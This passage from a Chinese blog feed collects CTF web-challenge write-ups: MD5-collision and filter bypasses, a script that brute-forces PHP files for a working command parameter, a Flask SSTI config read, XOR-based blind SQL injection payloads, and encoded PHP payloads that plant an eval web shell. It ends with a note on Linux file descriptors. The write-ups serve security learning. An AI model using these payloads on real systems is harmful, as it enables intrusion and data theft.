class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>这里比较难以理解的是为什么反斜杠可以绕过：<code>l\s</code> 可以执行。</p>
<blockquote>
<p>php解释器会将<code>//</code>解释为一个反斜杠；正则解释器也是一个道理。如果要用php正则匹配一个反斜杠，需要写4个反斜杠，因为四个反斜杠经过php解释器会变成两个反斜杠，两个反斜杠经过正则解释器会变成一个反斜杠，所以能够匹配。但是反常的是有时候三个反斜杠才能正则匹配一个反斜杠（本题就是），所以本题可以使用反斜杠绕过。</p>
</blockquote>
<p>但是也可以用其他办法，比如<code>ls</code>用<code>dir</code>代替，<code>cat</code> 用<code>sort</code>代替。因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dir+/</span><br><span class="line">2. sort+/flag</span><br></pre></td></tr></table></figure></p>
<p>用burp提交！+也可以用%20代替。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401223906.png" /></p>
<h1 id="总结">总结</h1>
<p>本题的难点主要在于MD5碰撞和最后的过滤绕过。尤其是反斜杠绕过，实在不能理解。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>php伪协议</tag>
        <tag>MD5碰撞绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯 2019 高明的黑客</title>
    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
<h1 id="解题">解题</h1>
<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
<p>最终结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_shrine</title>
    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
<li>第二可以访问/shrine/xxx；</li>
<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
</ul>
<p>查看是否存在SSTI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
<h1 id="解题">解题</h1>
<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接得到flag：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Jinjia2</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 FinalSQL</title>
    <url>/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5B极客大挑战%202019%5DFinalSQL">FinalSQL</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入页面，经过相关的测试，发现了三个可能的注入点：用户名、密码和点击数字小方框之后url出现的id。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png" /></p>
<p>并且，根据最上面的提示，本题估计是sql盲注。</p>
<h1 id="解题">解题</h1>
<p>首先以为注入点在用户名和密码，就对其进行了模糊测试：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181744.png" /></p>
<p>发现过滤了许多东西，而且无法绕过。后来找到了当输入<code>\</code>时，系统报错了，我欣喜若狂，以为这里就是注入点，并且之前还记录了[[过滤单引号的注入方法]]。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181822.png" /></p>
<p>经过测试，这里确实存在着注入点，但是许多要使用的关键词都被过滤了，比如<code>or</code>、<code>and</code>等，导致无法绕过。</p>
<p>之后我又去尝试了一下第三个可能的注入点，当我输入如下值时： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=1 # NO! Not this! Click others</span><br><span class="line">?id=1=2 # ERROR!!!</span><br></pre></td></tr></table></figure></p>
<p>觉得这里存在着注入点，又经过了不断尝试，确定了注入点就在<code>id</code>，并且参数值正确的时候返回的就是该页面本来的内容，当参数值不正确的时候返回的就是<code>ERROR!!!</code>。</p>
<p>随后我进行了模糊测试</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417182427.png" /></p>
<p>（其中长度890的都是被过滤了）</p>
<p>由于这里没有回显，因此尝试盲注（脚本建议自己写，这题的flag字段内容非常多，就离谱）。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库长度: </span><br><span class="line">	异或: ?id=0^(length(database())=4) </span><br><span class="line">	or: ?id=(0)or(length(database())=4) # 下面的也可以用or</span><br><span class="line"></span><br><span class="line">数据库名: ?id=0^(ascii(substr(database(),%d,1))=%d) -&gt; geek</span><br><span class="line"></span><br><span class="line">表名：?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d) -&gt; F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line">字段名: ?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;,%d,1))=%d) -&gt; id,username,password</span><br><span class="line"></span><br><span class="line">字段信息: ?id=0^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),%d,1))=%d)</span><br><span class="line">(最后非常的阴间！！！flag在最后面，所以我倒着求，如果正着，总共有200+个字符！！！)</span><br></pre></td></tr></table></figure></p>
<hr />
<p>这里解释一下异或： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^0 -&gt; 0</span><br><span class="line">0^1 -&gt; 1</span><br><span class="line">1^0 -&gt; 1</span><br><span class="line">1^1 -&gt; 0</span><br></pre></td></tr></table></figure></p>
<p>以数据库长度的payload为例： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果这个为真(length(database())=4)，即值为1，那么?id=0^1=1，从而显示正确的页面内容。</span><br><span class="line">如果这个为假(length(database())=3)，即值为0，那么?id=0^0=0，从而显示错误的页面内容。</span><br></pre></td></tr></table></figure></p>
<p>因此，当<code>or</code>和<code>and</code>都被过滤的时候，可以考虑一下异或。</p>
<hr />
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <url>/2022/04/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20RCE%20ME/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5B极客大挑战%202019%5DRCE%20ME">RCE ME</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过代码审计： - 以GET方式传入参数code - code长度不能超过40 - code内不能包含大小写字母以及数字</p>
<h1 id="解题">2. 解题</h1>
<p>虽然知道存在RCE，但是这里不能使用字母和数字，因此可以使用取反绕过和异或绕过。</p>
<p>这里给一个自己写的异或的脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">payload</span>):</span></span><br><span class="line">    str1 = []</span><br><span class="line">    str2 = []</span><br><span class="line">    res1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(p)==i^j:</span><br><span class="line">                    str1.append(i)</span><br><span class="line">                    str2.append(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        res1 += <span class="built_in">str</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str2:</span><br><span class="line">        res2 += <span class="built_in">str</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(res1.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;%&#x27;</span>) + <span class="string">&#x27;^&#x27;</span> + res2.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;_GET&#x27;</span> <span class="comment"># 修改这里就行</span></span><br><span class="line">    xor(payload)</span><br></pre></td></tr></table></figure></p>
<p>首先查看phpinfo信息，如果直接异或得到phpinfo长度会超： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef();  # 远超40了</span><br></pre></td></tr></table></figure></p>
<p>因此如果使用异或需要换一个思路： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;_GET&#125;[_]();&amp;_=phpinfo</span><br></pre></td></tr></table></figure></p>
<p>这里利用了：</p>
<ol type="1">
<li>PHP动态函数的特性；</li>
<li>自己写一个 <code>$_GET</code>，然后参数自定义，这样就可以把长度全部放在自定义的参数上，绕过长度限制。</li>
</ol>
<p>将上面的payload异或： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;[_]();&amp;_=phpinfo # 这里其实[_]也可以用&#123;_&#125;代替</span><br></pre></td></tr></table></figure></p>
<p>如果使用取反就很简单了： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果：%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span></span><br></pre></td></tr></table></figure></p>
<p>payload: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure></p>
<p>查看其中的disable_functions信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430184544.png" /></p>
<p>发现命令执行的函数基本都被过滤了，看来之后要绕过。不论如何，先上线蚁剑： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$_=%80%80%80%80^%df%c7%c5%d4;$&#123;$_&#125;[__]($&#123;$_&#125;[___]);&amp;__=assert&amp;___=eval($_POST[&#x27;ant&#x27;])</span><br><span class="line"></span><br><span class="line">-&gt; ?code=$_=_GET;$&#123;_GET&#125;[__]($&#123;_GET&#125;[___]);&amp;__=assert&amp;___=eval($_POST[&#x27;ant&#x27;])</span><br></pre></td></tr></table></figure></p>
<p>这里需要注意eval不能调用eval，所以需要调用assert，而assert再7.0即以上的版本无法直接把字符串当作代码执行，所以assert调用eval然后再传入数据。[[远程命令、代码执行总结（PHP）]]</p>
<p>取反： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=urlencode(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=urlencode(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B  </span><br><span class="line">%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6</span><br></pre></td></tr></table></figure></p>
<p>payload：(不知道为什么超40了还可以) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);</span><br></pre></td></tr></table></figure></p>
<p>然后用蚁剑连接</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185612.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185739.png" /></p>
<p>发现在根目录下有两个与flag有关的，flag打开是空白，而readflag是可执行文件。调用插件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185700.png" /></p>
<p>然后得到一个shell，这个shell是可以执行命令的，直接执行<code>./readflag</code>得到flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220430185840.png" /></p>
<p>这里其实还涉及到劫持共享so，但是我不会。</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD &amp; putenv() - 安全客，安全资讯平台</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>disable_functions绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>理解Linux中的文件描述符(File Descriptor)</title>
    <url>/2022/05/15/%E7%90%86%E8%A7%A3Linux%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6(File%20Descriptor)/</url>
    <content><![CDATA[<p>个人知识记录。</p>
<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>file descriptor（一下简称为fd） 又叫文件描述符，它是一个抽象的指示符，用一个<strong>非负整数</strong>表示。它指向了由系统内核维护的一个 file table 中的某个条目(entry)。</p>
<p>（Windows中这东西叫做file handle，翻译为：句柄）</p>
<p>举个栗子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/test.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
<p>上述python代码中，f就可以类比为文件描述符，f就指向了 /tmp/test.txt，可以通过f对该文件进行读操作（如果设置了rw，那么就可以读写操作）。</p>
<h1 id="user-space-kernel-space">2. user space &amp; kernel space</h1>
<p>现在操作系统将内存划分为2个区域，分别用 user space(用户空间) 和 kernel space(内核空间)。用户的程序在 user space 中执行，系统内核在 kernel space 中执行。</p>
<p>用户的程序没有权限直接访问硬件资源，但是系统内核可以。比如读写本地文件需要访问磁盘，创建socket需要网卡等。因此，<strong>用户想要读写文件，必须要向内核发起读写请求，这个过程叫做 system call。内核收到用户程序的 system call 之后，负责访问硬件，并把结果放回给程序。</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/test.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="built_in">str</span> = f.read()</span><br></pre></td></tr></table></figure></p>
<p>上面的代码的流程如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515211022.png" /></p>
<h1 id="file-descriptor">3. File Descriptor</h1>
<p>上面简单介绍了User space和Kernel space，这对于理解fd有很大的帮助。fd会存在，就是因为用户程序无法直接访问硬件，因此当程序向内核发起system call打开一个文件时，在用户进程中必须有一个东西标识着打开的文件，这个东西就是fd。</p>
<blockquote>
<p>概念：Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
</blockquote>
<h2 id="file-tables">3.1. File tables</h2>
<p>和fd相关的一共有3张表，分别是：</p>
<ul>
<li>file descriptor table</li>
<li>file table</li>
<li>inode table</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515211325.png" /></p>
<h3 id="file-descriptor-table">3.1.1. file descriptor table</h3>
<p>file descriptors table由用户进程所有，每个进程都有一个这样的表，这里记录了进程打开的文件所代表的fd，fd的值映射到file table中的条目(entry)。</p>
<p>需要注意：每个进程都会预留3个默认的fd: stdin, stdout, stderr；它们的值分别为 0,1,2。</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Integer value</th>
<th style="text-align: center;">Name</th>
<th style="text-align: center;">Symbolic constant</th>
<th style="text-align: center;">file stream</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">0</td>
<td style="text-align: center;">standard input</td>
<td style="text-align: center;">STDIN_FILENO</td>
<td style="text-align: center;">stdin</td>
</tr>
<tr class="even">
<td style="text-align: center;">1</td>
<td style="text-align: center;">standard output</td>
<td style="text-align: center;">STDOUT_FILENO</td>
<td style="text-align: center;">stdout</td>
</tr>
<tr class="odd">
<td style="text-align: center;">2</td>
<td style="text-align: center;">standard error</td>
<td style="text-align: center;">STDERR_FILENO</td>
<td style="text-align: center;">stderr</td>
</tr>
</tbody>
</table>
<p>当Linux系统启动的时候，就会自动分配这三个fd。而子进程的fd会继承父进程的fd，因此所有的进程都会携带有这三个fd。</p>
<h3 id="file-table">3.1.2. file table</h3>
<p>file table是<strong>全局唯一</strong>的表，由系统内核维护。这个表记录了所有进程打开的文件的状态(是否可读、可写等状态)，同时它也映射到inode table中的entry。</p>
<h3 id="inode-table">3.1.3. inode table</h3>
